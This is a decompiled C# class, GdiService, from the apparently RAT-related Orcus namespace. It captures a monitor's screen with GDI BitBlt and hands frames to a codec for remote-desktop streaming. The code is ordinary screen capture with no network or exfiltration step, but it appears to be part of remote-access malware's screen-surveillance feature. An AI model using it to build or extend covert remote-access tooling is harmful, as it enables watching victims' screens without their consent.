using System;
using System.Drawing;
using System.Drawing.Imaging;
using System.Windows.Forms;
using Orcus.Shared.Utilities.Compression;

namespace Orcus.Commands.RemoteDesktop.Capture.GDI;

public class GdiService : IDisposable, IScreenCaptureService
{
	private const int SRCCOPY = 13369376;

	private Bitmap _currentImage;

	private IntPtr _scrDeviceContext;

	private Rectangle _boundsRectangle;

	private ScreenHelper _screenHelper;

	private int _currentMonitor;

	public bool IsSupported { get; } = true;


	public void Dispose()
	{
		Bitmap currentImage = _currentImage;
		if (currentImage != null)
		{
			((Image)currentImage).Dispose();
		}
		if (_scrDeviceContext != IntPtr.Zero)
		{
			NativeMethods.DeleteDC(_scrDeviceContext);
		}
		_currentImage = null;
		_scrDeviceContext = IntPtr.Zero;
	}

	public void Initialize(int monitor)
	{
		_screenHelper = new ScreenHelper();
		_scrDeviceContext = NativeMethods.CreateDC("DISPLAY", null, null, IntPtr.Zero);
		ChangeMonitor(monitor);
	}

	public void ChangeMonitor(int monitor)
	{
		//IL_003f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0049: Expected O, but got Unknown
		_boundsRectangle = Screen.get_AllScreens()[monitor].get_Bounds();
		Bitmap currentImage = _currentImage;
		if (currentImage != null)
		{
			((Image)currentImage).Dispose();
		}
		_currentImage = new Bitmap(_boundsRectangle.Width, _boundsRectangle.Height, (PixelFormat)2498570);
		_currentMonitor = monitor;
	}

	public RemoteDesktopDataInfo CaptureScreen(IStreamCodec streamCodec, ICursorStreamCodec cursorStreamCodec, bool updateCursor)
	{
		//IL_0099: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c2: Unknown result type (might be due to invalid IL or missing references)
		if (updateCursor)
		{
			_screenHelper.UpdateCursor(cursorStreamCodec, _currentMonitor);
		}
		Graphics val = Graphics.FromImage((Image)(object)_currentImage);
		try
		{
			IntPtr hdc = val.GetHdc();
			NativeMethods.BitBlt(hdc, 0, 0, _boundsRectangle.Width, _boundsRectangle.Height, _scrDeviceContext, _boundsRectangle.X, _boundsRectangle.Y, 13369376);
			val.ReleaseHdc(hdc);
			BitmapData val2 = _currentImage.LockBits(new Rectangle(0, 0, ((Image)_currentImage).get_Width(), ((Image)_currentImage).get_Height()), (ImageLockMode)1, ((Image)_currentImage).get_PixelFormat());
			try
			{
				return streamCodec.CodeImage(val2.get_Scan0(), _boundsRectangle, ((Image)_currentImage).get_Size(), ((Image)_currentImage).get_PixelFormat());
			}
			finally
			{
				_currentImage.UnlockBits(val2);
			}
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
	}

	public Bitmap CaptureScreen()
	{
		Graphics val = Graphics.FromImage((Image)(object)_currentImage);
		try
		{
			IntPtr hdc = val.GetHdc();
			NativeMethods.BitBlt(hdc, 0, 0, _boundsRectangle.Width, _boundsRectangle.Height, _scrDeviceContext, _boundsRectangle.X, _boundsRectangle.Y, 13369376);
			val.ReleaseHdc(hdc);
		}
		finally
		{
			((IDisposable)val)?.Dispose();
		}
		return _currentImage;
	}
}
